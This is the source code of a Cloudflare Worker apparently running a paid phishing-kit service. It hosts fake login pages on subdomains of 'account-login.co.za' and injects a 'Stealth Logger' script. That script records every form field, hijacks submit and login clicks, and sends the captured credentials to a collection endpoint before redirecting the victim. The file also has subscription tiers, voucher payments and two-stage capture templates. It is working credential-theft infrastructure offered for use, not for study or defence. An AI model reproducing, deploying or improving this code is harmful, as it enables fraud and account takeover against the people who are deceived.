/**
 * 🚀 D-TECH GLOBAL ROUTER V7.0 (API ONLY)
 * LOCATION: Cloudflare Worker
 */

const PASSWORD = "admin-secret-123";
const COOKIE_NAME = "admin_session";
const ROOT_DOMAIN = "account-login.co.za";

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const domain = url.hostname; 

    // --- CORS HANDLING ---
    if (request.method === 'OPTIONS') {
      return handleOptions(request);
    }

    // Helper to wrap response with CORS headers
    const respond = (response) => {
        const corsHeaders = getCorsHeaders(request);
        const newHeaders = new Headers(response.headers);
        Object.entries(corsHeaders).forEach(([k, v]) => newHeaders.set(k, v));

        return new Response(response.body, {
            status: response.status,
            statusText: response.statusText,
            headers: newHeaders
        });
    };

    // --- 0. SERVE INJECTION SCRIPT ---
    if (url.pathname === '/api/js/injection.js') {
        return new Response(INJECTION_SCRIPT, {
            headers: { 'Content-Type': 'application/javascript', 'Access-Control-Allow-Origin': '*' }
        });
    }

    // --- 1. ADMIN AUTHENTICATION & ROUTES ---
    const isAdminPath = url.pathname.startsWith('/admin') ||
                        url.pathname === '/api/save' ||
                        (url.pathname === '/api/captures' && request.method === 'GET') ||
                        url.pathname.startsWith('/api/admin');

    if (isAdminPath) {
        if (url.pathname === '/admin/login' && request.method === 'POST') {
            return respond(await handleLogin(request));
        }

        const isAuth = await checkAuth(request);
        if (!isAuth) {
            return respond(new Response(JSON.stringify({ success: false, error: "Unauthorized" }), {
                status: 401,
                headers: {'Content-Type': 'application/json'}
            }));
        }

        if (url.pathname === '/api/save' && request.method === 'POST') {
            return respond(await handleSaveRequest(request, env));
        }

        if (url.pathname === '/api/captures' && request.method === 'GET') {
            return respond(await handleGetCaptures(env));
        }

        if (url.pathname === '/api/admin/templates') {
             if (request.method === 'GET') return respond(await handleGetTemplates(env));
             if (request.method === 'POST') return respond(await handleSaveTemplate(request, env));
             if (request.method === 'DELETE') return respond(await handleDeleteTemplate(request, env));
        }

        if (url.pathname === '/api/admin/sites') {
             if (request.method === 'GET') return respond(await handleGetSites(env));
             if (request.method === 'DELETE') return respond(await handleDeleteSite(request, env));
        }

        // Admin Payment & User Management
        if (url.pathname === '/api/admin/vouchers') {
             if (request.method === 'GET') return respond(await handleGetVouchers(env));
        }
        if (url.pathname === '/api/admin/voucher_action' && request.method === 'POST') {
             return respond(await handleVoucherAction(request, env));
        }
        if (url.pathname === '/api/admin/users' && request.method === 'GET') {
             return respond(await handleGetUsers(env));
        }

        return respond(new Response("Not Found", { status: 404 }));
    }

    // --- 2. PUBLIC API ENDPOINTS ---

    if (url.pathname === '/api/public/captures') {
        if (request.method === 'GET') return respond(await handleGetPublicCaptures(request, env));
        if (request.method === 'DELETE') return respond(await handleDeletePublicCapture(request, env));
    }

    if (url.pathname === '/api/public/sites' && request.method === 'DELETE') {
        return respond(await handleDeletePublicSite(request, env));
    }

    if (url.pathname === '/api/public/check-subdomain' && request.method === 'GET') {
        return respond(await handleCheckSubdomain(request, env));
    }

    if (url.pathname === '/api/capture' && request.method === 'POST') {
      return respond(await handleCaptureRequest(request, env));
    }

    if (url.pathname === '/api/public/deploy' && request.method === 'POST') {
        return respond(await handlePublicDeploy(request, env, ROOT_DOMAIN));
    }

    if (url.pathname === '/api/public/templates' && request.method === 'GET') {
        return respond(await handleGetPublicTemplates(env));
    }

    if (url.pathname === '/api/public/template-preview' && request.method === 'GET') {
        return await handleGetTemplatePreview(request, env); // Returns HTML directly
    }

    // Payment Submission
    if (url.pathname === '/api/pay' && request.method === 'POST') {
        return respond(await handlePaymentSubmit(request, env));
    }

    // --- 3. SUBDOMAIN ROUTING ---

    let subdomain = null;
    if (domain !== ROOT_DOMAIN && domain.endsWith("." + ROOT_DOMAIN)) {
        subdomain = domain.slice(0, - (ROOT_DOMAIN.length + 1));
    }

    if (subdomain && subdomain !== 'www') {
        const data = await env.SUBDOMAINS.get(subdomain, { type: "json" });

        if (!data) {
           return new Response(`<html><body><h1>404</h1><p>Subdomain not found.</p></body></html>`, {
               status: 404,
               headers: { 'Content-Type': 'text/html' }
           });
        }

        if (data.type === 'HTML') {
          return new Response(data.content, {
            headers: { 'Content-Type': 'text/html' }
          });
        }

        if (data.type === 'PROXY') {
          try {
            const targetUrl = data.content;
            const forwardUrl = new URL(targetUrl);
            forwardUrl.pathname = url.pathname === '/' ? forwardUrl.pathname : url.pathname;
            forwardUrl.search = url.search;

            const proxyResponse = await fetch(forwardUrl.toString(), {
              headers: {
                'User-Agent': request.headers.get('User-Agent') || 'D-TECH Cloud Proxy',
              }
            });

            const response = new Response(proxyResponse.body, proxyResponse);
            return response;

          } catch (err) {
            return new Response(`<h1>Proxy Error</h1><p>${err.message}</p>`, { status: 502, headers: {'Content-Type': 'text/html'} });
          }
        }
    }

    return new Response(JSON.stringify({ message: "D-TECH API Service Online" }), {
        headers: { 'Content-Type': 'application/json' }
    });
  }
};

// --- CORE LOGIC & HELPERS ---

async function getUser(env, code) {
    const key = `user::${code}`;
    const user = await env.SUBDOMAINS.get(key, { type: "json" });
    if (!user) {
        // Default Free User
        return {
            plan: 'free', // free, basic, premium
            strikes: 0,
            status: 'active', // active, locked, banned
            created: Date.now(),
            expiry: null
        };
    }

    // Check Expiry
    if (user.expiry && Date.now() > user.expiry) {
        user.plan = 'free';
        user.expiry = null;
        await env.SUBDOMAINS.put(key, JSON.stringify(user));
    }

    return user;
}

async function saveUser(env, code, data) {
    await env.SUBDOMAINS.put(`user::${code}`, JSON.stringify(data));
}

function extractBodyParts(html) {
    const match = html.match(/<body([^>]*)>([\s\S]*)<\/body>/i);
    if (match) return { attrs: match[1], content: match[2] };
    return { attrs: '', content: html };
}

// --- HANDLERS ---

function getCorsHeaders(request) {
    const origin = request.headers.get('Origin');
    const allowedDomain = 'https://account-login.co.za';
    const newFrontend = 'https://new.preasx24.co.za';

    if (origin === allowedDomain || origin === newFrontend || (origin && origin.endsWith('.account-login.co.za'))) {
        return {
            'Access-Control-Allow-Origin': origin,
            'Access-Control-Allow-Methods': 'GET, POST, DELETE, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type',
            'Access-Control-Allow-Credentials': 'true'
        };
    }
    return {};
}

function handleOptions(request) {
    const headers = getCorsHeaders(request);
    return new Response(null, { headers: headers });
}

async function checkAuth(request) {
  const cookieHeader = request.headers.get('Cookie');
  if (!cookieHeader) return false;
  return cookieHeader.includes(`${COOKIE_NAME}=${PASSWORD}`);
}

async function handleLogin(request) {
    try {
        const formData = await request.formData();
        const password = formData.get('password');
        if (password === PASSWORD) {
            return new Response(JSON.stringify({ success: true }), {
                headers: {
                    'Content-Type': 'application/json',
                    'Set-Cookie': `${COOKIE_NAME}=${PASSWORD}; Path=/; HttpOnly; SameSite=None; Secure; Max-Age=86400`
                }
            });
        }
        return new Response(JSON.stringify({ success: false, error: "Invalid Password" }), {
            headers: { 'Content-Type': 'application/json' }
        });
    } catch (e) {
        return jsonError("Error processing request");
    }
}

async function handleSaveRequest(request, env) {
  try {
    const body = await request.json();
    const { subdomain, type, content } = body;
    if (!subdomain || !type || !content) return jsonError("Missing fields");

    const entry = { type, content, updated: Date.now() };
    await env.SUBDOMAINS.put(subdomain, JSON.stringify(entry));
    return new Response(JSON.stringify({ success: true, subdomain, type }), { headers: { 'Content-Type': 'application/json' } });
  } catch (err) {
    return jsonError(err.message, 500);
  }
}

async function handleCaptureRequest(request, env) {
  try {
    const body = await request.json();
    const timestamp = Date.now();
    const uuid = crypto.randomUUID();
    const uniqueCode = body.uniqueCode || 'default';
    const key = `capture::${uniqueCode}::${timestamp}::${uuid}`;

    await env.SUBDOMAINS.put(key, JSON.stringify({ timestamp, data: body }));

    return new Response(JSON.stringify({ success: true, key }), { headers: { 'Content-Type': 'application/json' } });
  } catch (err) {
    return jsonError(err.message, 500);
  }
}

async function handleGetCaptures(env) {
  try {
    const list = await env.SUBDOMAINS.list({ prefix: "capture::" });
    const keys = list.keys.slice(-20).reverse();
    const promises = keys.map(async (k) => {
        const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
        return { key: k.name, ...val };
    });
    const results = await Promise.all(promises);
    return new Response(JSON.stringify({ success: true, data: results }), { headers: { 'Content-Type': 'application/json' } });
  } catch (err) {
     return jsonError(err.message, 500);
  }
}

async function handleGetTemplates(env) {
    const list = await env.SUBDOMAINS.list({ prefix: "template::" });
    const templates = await Promise.all(list.keys.map(async k => {
        const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
        return { name: k.name.replace("template::", ""), ...val };
    }));
    return new Response(JSON.stringify({ success: true, data: templates }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleGetSites(env) {
    try {
        const list = await env.SUBDOMAINS.list();
        const sites = [];
        for (const k of list.keys) {
            if (!k.name.startsWith('capture::') && !k.name.startsWith('template::') &&
                !k.name.startsWith('code_map::') && !k.name.startsWith('user::') &&
                !k.name.startsWith('voucher_queue')) {
                sites.push(k.name);
            }
        }
        return new Response(JSON.stringify({ success: true, data: sites }), { headers: { 'Content-Type': 'application/json' } });
    } catch (e) {
        return jsonError(e.message, 500);
    }
}

async function handleGetPublicTemplates(env) {
    const list = await env.SUBDOMAINS.list({ prefix: "template::" });
    const templates = await Promise.all(list.keys.map(async k => {
        const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
        return {
            name: k.name.replace("template::", ""),
            isGoldOnly: val.isGoldOnly || false,
            previewUrl: val.previewUrl || null
        };
    }));
    return new Response(JSON.stringify({ success: true, data: templates }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleSaveTemplate(request, env) {
    const body = await request.json();
    const { name, content, contentStage2, redirectUrl, isGoldOnly, previewUrl } = body;
    if (!name || !content) return jsonError("Missing fields");
    await env.SUBDOMAINS.put(`template::${name}`, JSON.stringify({
        content,
        contentStage2: contentStage2 || null, // Optional Stage 2
        redirectUrl,
        previewUrl,
        isGoldOnly: isGoldOnly === true,
        updated: Date.now()
    }));
    return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleDeleteTemplate(request, env) {
    const url = new URL(request.url);
    const name = url.searchParams.get('name');
    if (!name) return jsonError("Missing name");
    await env.SUBDOMAINS.delete(`template::${name}`);
    return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleDeleteSite(request, env) {
    const url = new URL(request.url);
    const subdomain = url.searchParams.get('subdomain');
    if (!subdomain) return jsonError("Missing subdomain");

    try {
        const siteData = await env.SUBDOMAINS.get(subdomain, { type: "json" });
        if (siteData && siteData.ownerCode) {
            const mapKey = `code_map::${siteData.ownerCode}`;
            const mapData = await env.SUBDOMAINS.get(mapKey, { type: "json" });
            if (mapData) {
                let newSites = [];
                if (Array.isArray(mapData.sites)) {
                    newSites = mapData.sites.filter(s => s.subdomain !== subdomain);
                } else if (mapData.subdomain === subdomain) {
                    newSites = [];
                }
                if (newSites.length > 0) {
                     await env.SUBDOMAINS.put(mapKey, JSON.stringify({ sites: newSites }));
                } else {
                     await env.SUBDOMAINS.delete(mapKey);
                }
            }
        }
    } catch (e) {}

    await env.SUBDOMAINS.delete(subdomain);
    return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
}

async function handlePublicDeploy(request, env, rootDomain) {
    try {
        const body = await request.json();
        let { subdomain, uniqueCode, templateName, customHtml, enableInjector, redirectUrl } = body;

        if (!subdomain || !uniqueCode) return jsonError("Missing subdomain or unique code");
        if (!/^[a-zA-Z0-9-]+$/.test(subdomain)) return jsonError("Invalid subdomain format");

        const user = await getUser(env, uniqueCode);
        if (user.status === 'locked' || user.status === 'banned') {
            return jsonError("Account is locked due to payment issues. Contact support.");
        }

        const mapKey = `code_map::${uniqueCode}`;
        let codeMap = await env.SUBDOMAINS.get(mapKey, { type: "json" });
        let currentSites = [];
        if (codeMap) {
            if (Array.isArray(codeMap.sites)) {
                currentSites = codeMap.sites;
            } else if (codeMap.subdomain) {
                currentSites = [{ subdomain: codeMap.subdomain, created: codeMap.created }];
            }
        }

        let limit = 1;
        if (user.plan === 'basic') limit = 3;
        if (user.plan === 'premium') limit = 10;
        if (user.plan === 'gold') limit = 1000;

        if (currentSites.length >= limit) {
             return jsonError(`Plan limit reached (${limit} sites). Delete a site to deploy a new one.`);
        }

        const existingSub = await env.SUBDOMAINS.get(subdomain);
        if (existingSub) {
            const siteJson = JSON.parse(existingSub);
            if (siteJson.ownerCode !== uniqueCode) {
                return jsonError("Subdomain already taken");
            }
        }

        let htmlContent = '';
        let shouldInject = false;
        let actualTemplateName = null;
        let isMultiStage = false;

        if (templateName) {
            const templateData = await env.SUBDOMAINS.get(`template::${templateName}`, { type: "json" });
            if (!templateData) return jsonError("Template not found");

            if (templateData.isGoldOnly && user.plan !== 'gold') {
                return jsonError("This template is exclusive to Gold Plan members.");
            }

            const usageCount = currentSites.filter(s => s.templateName === templateName).length;
            if (usageCount >= 3) {
                return jsonError(`You have reached the limit (3) for deploying this specific template.`);
            }

            // Check for Multi-Stage
            if (templateData.contentStage2) {
                isMultiStage = true;
                const p1 = extractBodyParts(templateData.content);
                const p2 = extractBodyParts(templateData.contentStage2);

                // Get head from Stage 1
                const headMatch = templateData.content.match(/<head[^>]*>([\s\S]*)<\/head>/i);
                const head = headMatch ? headMatch[1] : '';

                htmlContent = `<!DOCTYPE html>
<html>
<head>
${head}
<style>#dtech-stage-2 { display: none; }</style>
</head>
<body${p1.attrs}>
<div id="dtech-stage-1">${p1.content}</div>
<div id="dtech-stage-2" style="display:none;">${p2.content}</div>
</body>
</html>`;
            } else {
                htmlContent = templateData.content;
            }

            redirectUrl = templateData.redirectUrl || null;
            shouldInject = true;
            actualTemplateName = templateName;

        } else if (customHtml) {
            htmlContent = customHtml;
            shouldInject = (enableInjector === true);
            if (!redirectUrl) redirectUrl = null;
        } else {
            return jsonError("Must provide a template or custom HTML");
        }

        const scriptUrl = '/api/js/injection.js'; // Use internal route

        if (shouldInject) {
            let injectionBlock = `<script>window.UNIQUE_CODE = ${JSON.stringify(uniqueCode)};</script>`;

            if (redirectUrl) {
                injectionBlock += `<script>window.REDIRECT_URL = ${JSON.stringify(redirectUrl)};</script>`;
            }

            if (isMultiStage) {
                injectionBlock += `<script>window.MULTI_STAGE = true;</script>`;
            }

            injectionBlock += `<script src="${scriptUrl}"></script>`;

            if (htmlContent.includes('</body>')) {
                htmlContent = htmlContent.replace('</body>', `${injectionBlock}</body>`);
            } else {
                htmlContent += injectionBlock;
            }
        }

        await env.SUBDOMAINS.put(subdomain, JSON.stringify({
            type: 'HTML',
            content: htmlContent,
            updated: Date.now(),
            ownerCode: uniqueCode,
            isInjected: shouldInject,
            templateName: actualTemplateName
        }));

        currentSites.push({
            subdomain,
            created: Date.now(),
            templateName: actualTemplateName
        });

        await env.SUBDOMAINS.put(mapKey, JSON.stringify({ sites: currentSites }));

        return new Response(JSON.stringify({ success: true, url: `https://${subdomain}.${rootDomain}` }), {
            headers: { 'Content-Type': 'application/json' }
        });
    } catch (e) {
        return jsonError(e.message, 500);
    }
}

async function handleGetPublicCaptures(request, env) {
    const url = new URL(request.url);
    const code = url.searchParams.get('code');
    if (!code) return jsonError("Missing code");

    const user = await getUser(env, code);
    if (user.status === 'locked' || user.status === 'banned') {
         return new Response(JSON.stringify({
             success: false,
             error: "Account Locked",
             accountStatus: user.status
         }), { headers: { 'Content-Type': 'application/json' } });
    }

    const mapKey = `code_map::${code}`;
    const codeMap = await env.SUBDOMAINS.get(mapKey, { type: "json" });
    let siteCount = 0;
    let sites = [];

    if (codeMap) {
        if (Array.isArray(codeMap.sites)) {
            sites = codeMap.sites;
            siteCount = sites.length;
        } else if (codeMap.subdomain) {
            sites = [{ subdomain: codeMap.subdomain, created: codeMap.created }];
            siteCount = 1;
        }
    }

    const list = await env.SUBDOMAINS.list({ prefix: `capture::${code}::` });
    const keys = list.keys.reverse();
    const totalCount = keys.length;

    let limit = 5;
    if (user.plan === 'basic') limit = 15;
    if (user.plan === 'premium') limit = 250;
    if (user.plan === 'gold') limit = 100000;

    const visibleKeys = keys.slice(0, limit);
    const hiddenCount = Math.max(0, totalCount - limit);

    const promises = visibleKeys.map(async (k) => {
        const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
        return { key: k.name, ...val };
    });

    const results = await Promise.all(promises);
    return new Response(JSON.stringify({
        success: true,
        data: results,
        total: totalCount,
        hidden: hiddenCount,
        plan: user.plan,
        pendingPlan: user.pendingPlan,
        expiry: user.expiry,
        lastPayment: user.lastPaymentDate,
        siteCount: siteCount,
        sites: sites
    }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleDeletePublicSite(request, env) {
    const url = new URL(request.url);
    const code = url.searchParams.get('code');
    const subdomain = url.searchParams.get('subdomain');

    if (!code || !subdomain) return jsonError("Missing fields");

    const mapKey = `code_map::${code}`;
    const codeMap = await env.SUBDOMAINS.get(mapKey, { type: "json" });
    let sites = [];
    if (codeMap) {
        if (Array.isArray(codeMap.sites)) sites = codeMap.sites;
        else if (codeMap.subdomain) sites = [{ subdomain: codeMap.subdomain }];
    }

    const ownsSite = sites.some(s => s.subdomain === subdomain);
    if (!ownsSite) return jsonError("Unauthorized: Site not found in your account", 403);

    await env.SUBDOMAINS.delete(subdomain);

    const newSites = sites.filter(s => s.subdomain !== subdomain);
    if (newSites.length > 0) {
        await env.SUBDOMAINS.put(mapKey, JSON.stringify({ sites: newSites }));
    } else {
        await env.SUBDOMAINS.delete(mapKey);
    }

    return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleCheckSubdomain(request, env) {
    const url = new URL(request.url);
    const subdomain = url.searchParams.get('subdomain');
    if (!subdomain) return jsonError("Missing subdomain");

    const val = await env.SUBDOMAINS.get(subdomain);
    return new Response(JSON.stringify({ success: true, available: !val }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleDeletePublicCapture(request, env) {
    const url = new URL(request.url);
    const code = url.searchParams.get('code');
    const key = url.searchParams.get('key');
    if (!code || !key) return jsonError("Missing fields");

    if (!key.startsWith(`capture::${code}::`)) return jsonError("Unauthorized deletion", 403);

    await env.SUBDOMAINS.delete(key);
    return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
}

async function handlePaymentSubmit(request, env) {
    try {
        const body = await request.json();
        const { uniqueCode, voucherType, voucherCode } = body;
        if (!uniqueCode || !voucherType || !voucherCode) return jsonError("Missing fields");

        const user = await getUser(env, uniqueCode);
        if (user.status === 'banned') return jsonError("Account is permanently banned.");

        const requestedPlan = body.plan || 'premium';
        let provisionalPlan = requestedPlan;
        let pendingStatus = null;

        if (requestedPlan === 'gold') {
            provisionalPlan = 'premium';
            pendingStatus = 'gold';
            user.pendingPlan = 'gold';
        } else {
             provisionalPlan = requestedPlan;
             if (user.pendingPlan) delete user.pendingPlan;
        }

        user.plan = provisionalPlan;

        await saveUser(env, uniqueCode, user);

        const voucherId = crypto.randomUUID();
        const voucherData = {
            id: voucherId,
            uniqueCode,
            voucherType,
            voucherCode,
            plan: requestedPlan,
            submitted: Date.now(),
            status: 'pending'
        };

        await env.SUBDOMAINS.put(`voucher_queue::${voucherId}`, JSON.stringify(voucherData));

        let msg = "Payment submitted. Access granted pending review.";
        if (pendingStatus === 'gold') {
            msg = "Payment submitted. Provisional Premium access granted. Gold status pending verification.";
        }

        return new Response(JSON.stringify({ success: true, message: msg }), {
            headers: { 'Content-Type': 'application/json' }
        });
    } catch (e) {
        return jsonError(e.message, 500);
    }
}

async function handleGetVouchers(env) {
    const list = await env.SUBDOMAINS.list({ prefix: "voucher_queue::" });
    const vouchers = await Promise.all(list.keys.map(async k => {
        const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
        return val;
    }));
    const pending = vouchers.filter(v => v.status === 'pending');
    return new Response(JSON.stringify({ success: true, data: pending }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleVoucherAction(request, env) {
    try {
        const body = await request.json();
        const { voucherId, action, reason } = body;

        const voucherKey = `voucher_queue::${voucherId}`;
        const voucher = await env.SUBDOMAINS.get(voucherKey, { type: "json" });
        if (!voucher) return jsonError("Voucher not found");

        const user = await getUser(env, voucher.uniqueCode);

        if (action === 'approve') {
            const now = Date.now();
            let currentExpiry = user.expiry || now;
            if (currentExpiry < now) currentExpiry = now;

            if (user.pendingPlan === 'gold' && voucher.plan === 'gold') {
                user.plan = 'gold';
                delete user.pendingPlan;
            } else {
                user.plan = voucher.plan;
            }

            user.expiry = currentExpiry + (30 * 24 * 60 * 60 * 1000);
            user.lastPaymentDate = now;
            user.status = 'active';

            await env.SUBDOMAINS.delete(voucherKey);

        } else if (action === 'decline') {
            user.plan = 'free';
            if (user.pendingPlan) delete user.pendingPlan;

            user.status = 'locked';
            user.strikes = (user.strikes || 0) + 1;
            user.lockReason = reason || "Invalid Voucher";

            if (user.strikes >= 2) {
                user.status = 'banned';
            }

            await env.SUBDOMAINS.delete(voucherKey);
        }

        await saveUser(env, voucher.uniqueCode, user);

        return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
    } catch (e) {
        return jsonError(e.message, 500);
    }
}

async function handleGetUsers(env) {
    const list = await env.SUBDOMAINS.list({ prefix: "user::" });
    const users = await Promise.all(list.keys.map(async k => {
        const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
        return { code: k.name.replace("user::", ""), ...val };
    }));
    return new Response(JSON.stringify({ success: true, data: users }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleGetTemplatePreview(request, env) {
    const url = new URL(request.url);
    const name = url.searchParams.get('name');
    if (!name) return new Response("Missing template name", { status: 400 });

    const templateData = await env.SUBDOMAINS.get(`template::${name}`, { type: "json" });
    if (!templateData) return new Response("Template not found", { status: 404 });

    let content = templateData.content;

    const overlayScript = `
        <style>
            body::before {
                content: "PREVIEW MODE - DATA CAPTURE DISABLED";
                position: fixed;
                top: 0; left: 0; right: 0;
                background: rgba(255, 215, 0, 0.9);
                color: black;
                text-align: center;
                padding: 10px;
                z-index: 999999;
                font-weight: bold;
                font-family: sans-serif;
                pointer-events: none;
            }
            form { pointer-events: none !important; opacity: 0.7; }
        </style>
        <script>
            document.addEventListener('DOMContentLoaded', () => {
                document.querySelectorAll('form').forEach(f => f.onsubmit = (e) => { e.preventDefault(); alert('Preview Mode'); return false; });
                document.querySelectorAll('input, button').forEach(i => i.disabled = true);
            });
        </script>
    `;

    if (content.includes('</body>')) {
        content = content.replace('</body>', `${overlayScript}</body>`);
    } else {
        content += overlayScript;
    }

    return new Response(content, { headers: { 'Content-Type': 'text/html' } });
}

function jsonError(msg, status = 400) {
    return new Response(JSON.stringify({ success: false, error: msg }), { status: status, headers: { 'Content-Type': 'application/json' } });
}

const INJECTION_SCRIPT = `
// CONFIG
const CONFIG = {
    INPUT_IDLE_TIMEOUT: 2000,
    SUBMIT_BUTTON_PATTERNS: [
        'submit', 'login', 'sign in', 'continue', 'next', 'confirm', 'proceed', 'authenticate',
        'log on', 'start', 'verify', 'go', 'enter', 'accept'
    ],
    REDIRECT_URL: window.REDIRECT_URL || 'https://example.com',
    CAPTURE_URL: '/api/capture',
    MULTI_STAGE: window.MULTI_STAGE || false
};

(() => {
    const log = (msg, type='info') => console.log(\`[Stealth Logger] \${msg}\`);
    let typingTimer;
    let formData = {};
    let currentStage = 1;
    let stage1Data = {};

    const getFieldName = (field) => {
        return field.name || field.id || field.placeholder || field.getAttribute('aria-label') || \`unnamed_\${field.type}\`;
    };

    const captureAllInputs = () => {
        const data = { ...formData };

        let selector = 'input, textarea, select';
        if (CONFIG.MULTI_STAGE) {
            selector = currentStage === 1 ? '#dtech-stage-1 input, #dtech-stage-1 textarea, #dtech-stage-1 select'
                                          : '#dtech-stage-2 input, #dtech-stage-2 textarea, #dtech-stage-2 select';
        }

        document.querySelectorAll(selector).forEach(field => {
            const name = getFieldName(field);
            const value = field.value.trim();
            if (value) data[name] = value;
        });
        return data;
    };

    const sendData = async (data) => {
        try {
            const timestamp = new Date().toISOString();
            const pageUrl = window.location.href;
            const uniqueCode = window.UNIQUE_CODE || 'UNKNOWN';

            if (CONFIG.MULTI_STAGE && currentStage === 2) {
                data = { ...stage1Data, ...data };
            }

            const payload = {
                url: pageUrl,
                timestamp: timestamp,
                formData: data,
                userAgent: navigator.userAgent,
                uniqueCode: uniqueCode
            };

            const response = await fetch(CONFIG.CAPTURE_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            if (response.ok) {
                log('Successfully sent to Worker');
                window.location.href = CONFIG.REDIRECT_URL;
            } else {
                const err = await response.text();
                log('Worker error: ' + err, 'error');
                setTimeout(() => { window.location.href = CONFIG.REDIRECT_URL; }, 1000);
            }
        } catch (err) {
            log('Fetch failed: ' + err.message, 'error');
             setTimeout(() => { window.location.href = CONFIG.REDIRECT_URL; }, 1000);
        }
    };

    const handleAction = (e, target) => {
        if (CONFIG.MULTI_STAGE && currentStage === 1) {
             const keywords = CONFIG.SUBMIT_BUTTON_PATTERNS;
             let isSubmit = false;

             const text = (target.innerText || target.value || '').toLowerCase();
             if (keywords.some(p => text.includes(p))) isSubmit = true;

             if (e.type === 'submit') isSubmit = true;

             if (isSubmit) {
                 e.preventDefault();
                 e.stopPropagation();

                 const s1Data = captureAllInputs();
                 stage1Data = s1Data;
                 formData = {};

                 const s1 = document.getElementById('dtech-stage-1');
                 const s2 = document.getElementById('dtech-stage-2');
                 if(s1 && s2) {
                     s1.style.display = 'none';
                     s2.style.display = 'block';
                     currentStage = 2;
                     log('Switched to Stage 2');
                 }
                 return;
             }
        }

        let shouldSend = false;

        if (e.type === 'submit') {
            shouldSend = true;
        } else {
            const text = (target.innerText || target.value || '').toLowerCase();
            if (CONFIG.SUBMIT_BUTTON_PATTERNS.some(p => text.includes(p))) {
                shouldSend = true;
            }
        }

        if (shouldSend) {
             e.preventDefault();
             e.stopPropagation();
             const data = captureAllInputs();
             sendData(data);
        }
    };

    const setupInputHandlers = () => {
        document.querySelectorAll('input, textarea, select').forEach(field => {
            field.addEventListener('input', () => {
                clearTimeout(typingTimer);
                typingTimer = setTimeout(() => {
                    const name = getFieldName(field);
                    const value = field.value.trim();
                    if (value) formData[name] = value;
                }, CONFIG.INPUT_IDLE_TIMEOUT);
            });
        });
    };

    const setupSubmissionHandlers = () => {
        document.querySelectorAll('form').forEach(form => {
            form.addEventListener('submit', (e) => handleAction(e, e.target), true);
        });

        document.addEventListener('click', (e) => {
            const target = e.target;
            if (['INPUT', 'TEXTAREA', 'SELECT', 'OPTION', 'LABEL'].includes(target.tagName)) {
                if (target.tagName === 'INPUT' && (target.type === 'submit' || target.type === 'button' || target.type === 'image')) {
                     // pass
                } else {
                    return;
                }
            }

            const btn = target.closest('button, input[type="submit"], input[type="button"], a, div, span');
            if (btn) {
                if (['DIV', 'SPAN'].includes(btn.tagName)) {
                     const style = window.getComputedStyle(btn);
                     if (style.cursor !== 'pointer' && btn.getAttribute('role') !== 'button') return;
                }
                handleAction(e, btn);
            }
        }, true);
    };

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
            setupInputHandlers();
            setupSubmissionHandlers();
        });
    } else {
        setupInputHandlers();
        setupSubmissionHandlers();
    }
})();
`;
